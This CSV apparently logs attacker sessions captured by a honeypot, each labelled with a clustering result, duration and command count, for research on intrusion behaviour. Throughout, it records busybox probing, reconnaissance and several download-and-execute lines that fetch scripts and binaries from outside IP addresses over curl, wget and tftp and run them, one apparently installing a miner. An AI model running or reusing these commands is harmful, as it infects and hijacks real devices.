session,PCKmeans_exp_result,Unnamed: 0,duration,command_freq,input
081983eb6c2d,2,18656,1.403201818466186,13,rm .s; exit
58fc09338f6c,1,18657,0.30233883857727,1,nproc;uname -a
f4c152a8314f,1,18658,0.379573345184326,1,nproc;uname -a
0639af24019c,1,18659,0.362202167510986,1,nproc;uname -a
fa871697732c,4,18660,130.1521818637848,11,enable
fa871697732c,4,18661,130.1521818637848,11,system
fa871697732c,4,18662,130.1521818637848,11,system
fa871697732c,4,18663,130.1521818637848,11,shell
fa871697732c,4,18664,130.1521818637848,11,shell
fa871697732c,4,18665,130.1521818637848,11,sh
fa871697732c,4,18666,130.1521818637848,11,/bin/busybox VENUSZUELA
fa871697732c,4,18667,130.1521818637848,11,/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo ; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
fa871697732c,4,18668,130.1521818637848,11,cat /bin/busybox
fa871697732c,4,18669,130.1521818637848,11,while read i
fa871697732c,4,18670,130.1521818637848,11,dd if=/bin/busybox bs=22 count=1
384dd658546a,2,18945,5.981339693069458,13,enable
384dd658546a,2,18946,5.981339693069458,13,system
384dd658546a,2,18947,5.981339693069458,13,system
384dd658546a,2,18948,5.981339693069458,13,shell
384dd658546a,2,18949,5.981339693069458,13,shell
384dd658546a,2,18950,5.981339693069458,13,sh
384dd658546a,2,18951,5.981339693069458,13,cat /proc/mounts; /bin/busybox YYUDC
384dd658546a,2,18952,5.981339693069458,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YYUDC
384dd658546a,2,18953,5.981339693069458,13,tftp; wget; /bin/busybox YYUDC
384dd658546a,2,18954,5.981339693069458,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
384dd658546a,2,18955,5.981339693069458,13,while read i
384dd658546a,2,18956,5.981339693069458,13,/bin/busybox YYUDC
384dd658546a,2,18957,5.981339693069458,13,rm .s; exit
e68a186202d0,1,18958,174.9369180202484,9,/ip cloud print
e68a186202d0,1,18959,174.9369180202484,9,/ip cloud print
e68a186202d0,1,18960,174.9369180202484,9,ifconfig
e68a186202d0,1,18961,174.9369180202484,9,uname -a
e68a186202d0,1,18962,174.9369180202484,9,cat /proc/cpuinfo
e68a186202d0,1,18963,174.9369180202484,9,ps | grep '[Mm]iner'
e68a186202d0,1,18964,174.9369180202484,9,ps -ef | grep '[Mm]iner'
e68a186202d0,1,18965,174.9369180202484,9,ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
e68a186202d0,1,18966,174.9369180202484,9,echo Hi | cat -n
154b208b0b09,2,18967,1.6683411598205562,13,enable
154b208b0b09,2,18968,1.6683411598205562,13,system
154b208b0b09,2,18969,1.6683411598205562,13,system
154b208b0b09,2,18970,1.6683411598205562,13,shell
154b208b0b09,2,18971,1.6683411598205562,13,shell
154b208b0b09,2,18972,1.6683411598205562,13,sh
154b208b0b09,2,18973,1.6683411598205562,13,cat /proc/mounts; /bin/busybox GRCMR
154b208b0b09,2,18974,1.6683411598205562,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox GRCMR
154b208b0b09,2,18975,1.6683411598205562,13,tftp; wget; /bin/busybox GRCMR
154b208b0b09,2,18976,1.6683411598205562,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
154b208b0b09,2,18977,1.6683411598205562,13,while read i
154b208b0b09,2,18978,1.6683411598205562,13,/bin/busybox GRCMR
154b208b0b09,2,18979,1.6683411598205562,13,rm .s; exit
ddeff7a768c2,1,18980,0.318362712860107,1,nproc;uname -a
be14c6754630,1,18981,159.99969267845154,9,/ip cloud print
be14c6754630,1,18982,159.99969267845154,9,/ip cloud print
be14c6754630,1,18983,159.99969267845154,9,ifconfig
be14c6754630,1,18984,159.99969267845154,9,uname -a
be14c6754630,1,18985,159.99969267845154,9,cat /proc/cpuinfo
be14c6754630,1,18986,159.99969267845154,9,ps | grep '[Mm]iner'
be14c6754630,1,18987,159.99969267845154,9,ps -ef | grep '[Mm]iner'
be14c6754630,1,18988,159.99969267845154,9,ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
be14c6754630,1,18989,159.99969267845154,9,echo Hi | cat -n
a576ad9416d7,1,18990,61.77593541145325,3,uname -a;lspci | grep -i --color 'vga\|3d\|2d';curl -s -L http://222.100.89.36/stx.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr
a576ad9416d7,1,18991,61.77593541145325,3,lspci | grep -i --color vga\|3d\|2d
a576ad9416d7,1,18992,61.77593541145325,3,curl -s -L http://222.100.89.36/stx.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr
14024fe77fde,2,18993,5.060076713562012,13,enable
14024fe77fde,2,18994,5.060076713562012,13,system
14024fe77fde,2,18995,5.060076713562012,13,system
14024fe77fde,2,18996,5.060076713562012,13,shell
14024fe77fde,2,18997,5.060076713562012,13,shell
14024fe77fde,2,18998,5.060076713562012,13,sh
14024fe77fde,2,18999,5.060076713562012,13,cat /proc/mounts; /bin/busybox YMUVR
14024fe77fde,2,19000,5.060076713562012,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YMUVR
14024fe77fde,2,19001,5.060076713562012,13,tftp; wget; /bin/busybox YMUVR
14024fe77fde,2,19002,5.060076713562012,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
14024fe77fde,2,19003,5.060076713562012,13,while read i
14024fe77fde,2,19004,5.060076713562012,13,/bin/busybox YMUVR
14024fe77fde,2,19005,5.060076713562012,13,rm .s; exit
36715ada7bee,2,19006,1.447665452957153,13,enable
36715ada7bee,2,19007,1.447665452957153,13,system
36715ada7bee,2,19008,1.447665452957153,13,system
36715ada7bee,2,19009,1.447665452957153,13,shell
36715ada7bee,2,19010,1.447665452957153,13,shell
36715ada7bee,2,19011,1.447665452957153,13,sh
36715ada7bee,2,19012,1.447665452957153,13,cat /proc/mounts; /bin/busybox IZJFE
36715ada7bee,2,19013,1.447665452957153,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox IZJFE
36715ada7bee,2,19014,1.447665452957153,13,tftp; wget; /bin/busybox IZJFE
36715ada7bee,2,19015,1.447665452957153,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
36715ada7bee,2,19016,1.447665452957153,13,while read i
36715ada7bee,2,19017,1.447665452957153,13,/bin/busybox IZJFE
36715ada7bee,2,19018,1.447665452957153,13,rm .s; exit
b28538186d65,2,19019,15.75869870185852,13,enable
b28538186d65,2,19020,15.75869870185852,13,system
b28538186d65,2,19021,15.75869870185852,13,system
b28538186d65,2,19022,15.75869870185852,13,shell
b28538186d65,2,19023,15.75869870185852,13,shell
b28538186d65,2,19024,15.75869870185852,13,sh
b28538186d65,2,19025,15.75869870185852,13,cat /proc/mounts; /bin/busybox SEBIX
b28538186d65,2,19026,15.75869870185852,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox SEBIX
b28538186d65,2,19027,15.75869870185852,13,tftp; wget; /bin/busybox SEBIX
b28538186d65,2,19028,15.75869870185852,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
b28538186d65,2,19029,15.75869870185852,13,while read i
b28538186d65,2,19030,15.75869870185852,13,/bin/busybox SEBIX
b28538186d65,2,19031,15.75869870185852,13,rm .s; exit
9ed800e16b30,2,19032,1.633610486984253,13,enable
9ed800e16b30,2,19033,1.633610486984253,13,system
9ed800e16b30,2,19034,1.633610486984253,13,system
9ed800e16b30,2,19035,1.633610486984253,13,shell
9ed800e16b30,2,19036,1.633610486984253,13,shell
9ed800e16b30,2,19037,1.633610486984253,13,sh
9ed800e16b30,2,19038,1.633610486984253,13,cat /proc/mounts; /bin/busybox WQQFB
9ed800e16b30,2,19039,1.633610486984253,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox WQQFB
9ed800e16b30,2,19040,1.633610486984253,13,tftp; wget; /bin/busybox WQQFB
9ed800e16b30,2,19041,1.633610486984253,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
9ed800e16b30,2,19042,1.633610486984253,13,while read i
9ed800e16b30,2,19043,1.633610486984253,13,/bin/busybox WQQFB
9ed800e16b30,2,19044,1.633610486984253,13,rm .s; exit
8b4e311a22f5,1,19045,9.261987924575806,5,sh
8b4e311a22f5,1,19046,9.261987924575806,5,shell
8b4e311a22f5,1,19047,9.261987924575806,5,shell
8b4e311a22f5,1,19048,9.261987924575806,5,help
8b4e311a22f5,1,19049,9.261987924575806,5,busybox
b314eab591c7,0,19050,17.775508880615234,2,sh
b314eab591c7,0,19051,17.775508880615234,2,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://20.195.193.224/Sakura.sh; chmod 777 *; sh Sakura.sh; tftp -g 20.195.193.224 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -
5ef3e2202d50,1,19052,1.6024878025054932,1,(uname -smr || /bin/uname -smr || /usr/bin/uname -smr)
5acfd7dc6109,1,19053,0.415303468704223,1,scp -t /tmp/nLJ9sWYx
b93156e233a2,0,19054,0.400397777557373,3,cd /tmp && chmod +x nLJ9sWYx && bash -c ./nLJ9sWYx
b93156e233a2,0,19055,0.400397777557373,3,./nLJ9sWYx
b93156e233a2,0,19056,0.400397777557373,3,./nLJ9sWYx
fa8ed70f6495,0,19057,85.56950950622559,3,uname -a;lspci | grep -i --color 'vga\|3d\|2d';curl -s -L http://222.100.89.36/stx.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr
fa8ed70f6495,0,19058,85.56950950622559,3,lspci | grep -i --color vga\|3d\|2d
fa8ed70f6495,0,19059,85.56950950622559,3,curl -s -L http://222.100.89.36/stx.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr
6b2e92837493,0,19060,2.881392240524292,19,start
6b2e92837493,0,19061,2.881392240524292,19,start
6b2e92837493,0,19062,2.881392240524292,19,enable
6b2e92837493,0,19063,2.881392240524292,19,config terminal
6b2e92837493,0,19064,2.881392240524292,19,config terminal
6b2e92837493,0,19065,2.881392240524292,19,system
6b2e92837493,0,19066,2.881392240524292,19,system
6b2e92837493,0,19067,2.881392240524292,19,linuxshell
6b2e92837493,0,19068,2.881392240524292,19,linuxshell
6b2e92837493,0,19069,2.881392240524292,19,su
6b2e92837493,0,19070,2.881392240524292,19,shell
6b2e92837493,0,19071,2.881392240524292,19,shell
6b2e92837493,0,19072,2.881392240524292,19,sh
6b2e92837493,0,19073,2.881392240524292,19,cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\x45\x4c\x46'
6b2e92837493,0,19074,2.881392240524292,19,echo -ne \x45\x4c\x46
6b2e92837493,0,19075,2.881392240524292,19,/bin/busybox wget;/bin/busybox echo -ne '\x45\x4c\x46'
6b2e92837493,0,19076,2.881392240524292,19,wget
6b2e92837493,0,19077,2.881392240524292,19,echo -ne \x45\x4c\x46
6b2e92837493,0,19078,2.881392240524292,19,cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O http://192.168.1.1:8088/i; /bin/busybox wget http://192.168.1.1:8088/i; chmod 777 i || (cp /bin/ls ii;cat i>ii;rm i;cp ii i;rm ii); ./i; echo -e '\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64'
aa965a08eac9,2,19079,32.702641248703,14,enable
aa965a08eac9,2,19080,32.702641248703,14,system
aa965a08eac9,2,19081,32.702641248703,14,system
aa965a08eac9,2,19082,32.702641248703,14,shell
aa965a08eac9,2,19083,32.702641248703,14,shell
aa965a08eac9,2,19084,32.702641248703,14,sh
aa965a08eac9,2,19085,32.702641248703,14,cat /proc/mounts; /bin/busybox BDAVR
aa965a08eac9,2,19086,32.702641248703,14,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox BDAVR
aa965a08eac9,2,19087,32.702641248703,14,tftp; wget; /bin/busybox BDAVR
aa965a08eac9,2,19088,32.702641248703,14,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
aa965a08eac9,2,19089,32.702641248703,14,while read i
aa965a08eac9,2,19090,32.702641248703,14,/bin/busybox BDAVR
aa965a08eac9,2,19091,32.702641248703,14,rm .s; tftp -l.i -r.i -g 144.48.170.110:19280; chmod 777 .i; ./.i; exit
aa965a08eac9,2,19092,32.702641248703,14,./.i
8b5da5febd57,2,19093,4.548946857452393,13,enable
8b5da5febd57,2,19094,4.548946857452393,13,system
8b5da5febd57,2,19095,4.548946857452393,13,system
8b5da5febd57,2,19096,4.548946857452393,13,shell
8b5da5febd57,2,19097,4.548946857452393,13,shell
8b5da5febd57,2,19098,4.548946857452393,13,sh
8b5da5febd57,2,19099,4.548946857452393,13,cat /proc/mounts; /bin/busybox WRSCB
8b5da5febd57,2,19100,4.548946857452393,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox WRSCB
8b5da5febd57,2,19101,4.548946857452393,13,tftp; wget; /bin/busybox WRSCB
8b5da5febd57,2,19102,4.548946857452393,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
8b5da5febd57,2,19103,4.548946857452393,13,while read i
8b5da5febd57,2,19104,4.548946857452393,13,/bin/busybox WRSCB
8b5da5febd57,2,19105,4.548946857452393,13,rm .s; exit
bc701fca4ed9,2,19106,0.7675392627716061,13,enable
bc701fca4ed9,2,19107,0.7675392627716061,13,system
bc701fca4ed9,2,19108,0.7675392627716061,13,system
bc701fca4ed9,2,19109,0.7675392627716061,13,shell
bc701fca4ed9,2,19110,0.7675392627716061,13,shell
bc701fca4ed9,2,19111,0.7675392627716061,13,sh
bc701fca4ed9,2,19112,0.7675392627716061,13,cat /proc/mounts; /bin/busybox WZUVR
bc701fca4ed9,2,19113,0.7675392627716061,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox WZUVR
bc701fca4ed9,2,19114,0.7675392627716061,13,tftp; wget; /bin/busybox WZUVR
bc701fca4ed9,2,19115,0.7675392627716061,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
bc701fca4ed9,2,19116,0.7675392627716061,13,while read i
bc701fca4ed9,2,19117,0.7675392627716061,13,/bin/busybox WZUVR
bc701fca4ed9,2,19118,0.7675392627716061,13,rm .s; exit
d59087cb335e,1,19119,77.81353425979614,3,uname -a;lspci | grep -i --color 'vga\|3d\|2d';curl -s -L http://222.100.89.36/stx.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr
d59087cb335e,1,19120,77.81353425979614,3,lspci | grep -i --color vga\|3d\|2d
d59087cb335e,1,19121,77.81353425979614,3,curl -s -L http://222.100.89.36/stx.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr
8b84d0ef8620,2,19122,2.679492235183716,13,enable
8b84d0ef8620,2,19123,2.679492235183716,13,system
8b84d0ef8620,2,19124,2.679492235183716,13,system
8b84d0ef8620,2,19125,2.679492235183716,13,shell
8b84d0ef8620,2,19126,2.679492235183716,13,shell
8b84d0ef8620,2,19127,2.679492235183716,13,sh
8b84d0ef8620,2,19128,2.679492235183716,13,cat /proc/mounts; /bin/busybox JIWXK
8b84d0ef8620,2,19129,2.679492235183716,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox JIWXK
8b84d0ef8620,2,19130,2.679492235183716,13,tftp; wget; /bin/busybox JIWXK
8b84d0ef8620,2,19131,2.679492235183716,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
8b84d0ef8620,2,19132,2.679492235183716,13,while read i
8b84d0ef8620,2,19133,2.679492235183716,13,/bin/busybox JIWXK
8b84d0ef8620,2,19134,2.679492235183716,13,rm .s; exit
7ebe39c84d8f,2,19135,2.103899717330932,13,enable
7ebe39c84d8f,2,19136,2.103899717330932,13,system
7ebe39c84d8f,2,19137,2.103899717330932,13,system
7ebe39c84d8f,2,19138,2.103899717330932,13,shell
7ebe39c84d8f,2,19139,2.103899717330932,13,shell
7ebe39c84d8f,2,19140,2.103899717330932,13,sh
7ebe39c84d8f,2,19141,2.103899717330932,13,cat /proc/mounts; /bin/busybox NOWBX
7ebe39c84d8f,2,19142,2.103899717330932,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox NOWBX
7ebe39c84d8f,2,19143,2.103899717330932,13,tftp; wget; /bin/busybox NOWBX
7ebe39c84d8f,2,19144,2.103899717330932,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
7ebe39c84d8f,2,19145,2.103899717330932,13,while read i
7ebe39c84d8f,2,19146,2.103899717330932,13,/bin/busybox NOWBX
7ebe39c84d8f,2,19147,2.103899717330932,13,rm .s; exit
0219bd72e903,2,19148,0.948962450027465,13,enable
0219bd72e903,2,19149,0.948962450027465,13,system
0219bd72e903,2,19150,0.948962450027465,13,system
0219bd72e903,2,19151,0.948962450027465,13,shell
0219bd72e903,2,19152,0.948962450027465,13,shell
0219bd72e903,2,19153,0.948962450027465,13,sh
0219bd72e903,2,19154,0.948962450027465,13,cat /proc/mounts; /bin/busybox MWLNA
0219bd72e903,2,19155,0.948962450027465,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox MWLNA
0219bd72e903,2,19156,0.948962450027465,13,tftp; wget; /bin/busybox MWLNA
0219bd72e903,2,19157,0.948962450027465,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
0219bd72e903,2,19158,0.948962450027465,13,while read i
0219bd72e903,2,19159,0.948962450027465,13,/bin/busybox MWLNA
0219bd72e903,2,19160,0.948962450027465,13,rm .s; exit
996a8df2a3c8,1,19161,24.899381160736084,11,enable
996a8df2a3c8,1,19162,24.899381160736084,11,system
996a8df2a3c8,1,19163,24.899381160736084,11,system
996a8df2a3c8,1,19164,24.899381160736084,11,shell
996a8df2a3c8,1,19165,24.899381160736084,11,shell
996a8df2a3c8,1,19166,24.899381160736084,11,sh
996a8df2a3c8,1,19167,24.899381160736084,11,linuxshell
996a8df2a3c8,1,19168,24.899381160736084,11,linuxshell
996a8df2a3c8,1,19169,24.899381160736084,11,/bin/busybox TSUNAMI
996a8df2a3c8,1,19170,24.899381160736084,11,/bin/busybox cat /bin/busybox
996a8df2a3c8,1,19171,24.899381160736084,11,cat /bin/busybox
da7004fb17be,1,19172,92.6908037662506,9,/ip cloud print
da7004fb17be,1,19173,92.6908037662506,9,/ip cloud print
da7004fb17be,1,19174,92.6908037662506,9,ifconfig
da7004fb17be,1,19175,92.6908037662506,9,uname -a
da7004fb17be,1,19176,92.6908037662506,9,cat /proc/cpuinfo
da7004fb17be,1,19177,92.6908037662506,9,ps | grep '[Mm]iner'
da7004fb17be,1,19178,92.6908037662506,9,ps -ef | grep '[Mm]iner'
da7004fb17be,1,19179,92.6908037662506,9,ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
da7004fb17be,1,19180,92.6908037662506,9,echo Hi | cat -n
b2a6b0e48279,2,19181,2.497426033020019,13,enable
b2a6b0e48279,2,19182,2.497426033020019,13,system
b2a6b0e48279,2,19183,2.497426033020019,13,system
b2a6b0e48279,2,19184,2.497426033020019,13,shell
b2a6b0e48279,2,19185,2.497426033020019,13,shell
b2a6b0e48279,2,19186,2.497426033020019,13,sh
b2a6b0e48279,2,19187,2.497426033020019,13,cat /proc/mounts; /bin/busybox JVVEY
b2a6b0e48279,2,19188,2.497426033020019,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox JVVEY
b2a6b0e48279,2,19189,2.497426033020019,13,tftp; wget; /bin/busybox JVVEY
b2a6b0e48279,2,19190,2.497426033020019,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
b2a6b0e48279,2,19191,2.497426033020019,13,while read i
b2a6b0e48279,2,19192,2.497426033020019,13,/bin/busybox JVVEY
b2a6b0e48279,2,19193,2.497426033020019,13,rm .s; exit
0eb393ce1d54,2,19194,8.772375106811523,13,enable
0eb393ce1d54,2,19195,8.772375106811523,13,system
0eb393ce1d54,2,19196,8.772375106811523,13,system
0eb393ce1d54,2,19197,8.772375106811523,13,shell
0eb393ce1d54,2,19198,8.772375106811523,13,shell
0eb393ce1d54,2,19199,8.772375106811523,13,sh
0eb393ce1d54,2,19200,8.772375106811523,13,cat /proc/mounts; /bin/busybox RHADZ
0eb393ce1d54,2,19201,8.772375106811523,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox RHADZ
0eb393ce1d54,2,19202,8.772375106811523,13,tftp; wget; /bin/busybox RHADZ
0eb393ce1d54,2,19203,8.772375106811523,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
0eb393ce1d54,2,19204,8.772375106811523,13,while read i
0eb393ce1d54,2,19205,8.772375106811523,13,/bin/busybox RHADZ
0eb393ce1d54,2,19206,8.772375106811523,13,rm .s; exit
e82d1d1ea7b5,2,19207,2.278246402740478,13,enable
e82d1d1ea7b5,2,19208,2.278246402740478,13,system
e82d1d1ea7b5,2,19209,2.278246402740478,13,system
e82d1d1ea7b5,2,19210,2.278246402740478,13,shell
e82d1d1ea7b5,2,19211,2.278246402740478,13,shell
e82d1d1ea7b5,2,19212,2.278246402740478,13,sh
e82d1d1ea7b5,2,19213,2.278246402740478,13,cat /proc/mounts; /bin/busybox YQKIE
e82d1d1ea7b5,2,19214,2.278246402740478,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YQKIE
e82d1d1ea7b5,2,19215,2.278246402740478,13,tftp; wget; /bin/busybox YQKIE
e82d1d1ea7b5,2,19216,2.278246402740478,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
e82d1d1ea7b5,2,19217,2.278246402740478,13,while read i
e82d1d1ea7b5,2,19218,2.278246402740478,13,/bin/busybox YQKIE
e82d1d1ea7b5,2,19219,2.278246402740478,13,rm .s; exit
3aeb5b823526,1,19220,67.36505460739136,3,uname -a;lspci | grep -i --color 'vga\|3d\|2d';curl -s -L http://222.100.89.36/stx.sh | LC_ALL=en_US.UTF-8 bash -s 49G2LmJhnRZMLGQvYE8d8ACxtgfTaxBpgUCY6sT8cNTWBeBZUkfMnnJULG1x12tLxQ3VDVmL2hxJVAHBVA5TVrcTQ8N1KRN
3aeb5b823526,1,19221,67.36505460739136,3,lspci | grep -i --color vga\|3d\|2d
3aeb5b823526,1,19222,67.36505460739136,3,curl -s -L http://222.100.89.36/stx.sh | LC_ALL=en_US.UTF-8 bash -s 49G2LmJhnRZMLGQvYE8d8ACxtgfTaxBpgUCY6sT8cNTWBeBZUkfMnnJULG1x12tLxQ3VDVmL2hxJVAHBVA5TVrcTQ8N1KRN
ecdb696ccb09,1,19223,61.22535037994385,3,uname -a;lspci | grep -i --color 'vga\|3d\|2d';curl -s -L http://222.100.89.36/stx.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr
ecdb696ccb09,1,19224,61.22535037994385,3,lspci | grep -i --color vga\|3d\|2d
ecdb696ccb09,1,19225,61.22535037994385,3,curl -s -L http://222.100.89.36/stx.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr
37d92aa318ec,2,19226,3.416298866271972,13,enable
37d92aa318ec,2,19227,3.416298866271972,13,system
37d92aa318ec,2,19228,3.416298866271972,13,system
37d92aa318ec,2,19229,3.416298866271972,13,shell
37d92aa318ec,2,19230,3.416298866271972,13,shell
37d92aa318ec,2,19231,3.416298866271972,13,sh
37d92aa318ec,2,19232,3.416298866271972,13,cat /proc/mounts; /bin/busybox PVZYL
37d92aa318ec,2,19233,3.416298866271972,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox PVZYL
37d92aa318ec,2,19234,3.416298866271972,13,tftp; wget; /bin/busybox PVZYL
37d92aa318ec,2,19235,3.416298866271972,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
37d92aa318ec,2,19236,3.416298866271972,13,while read i
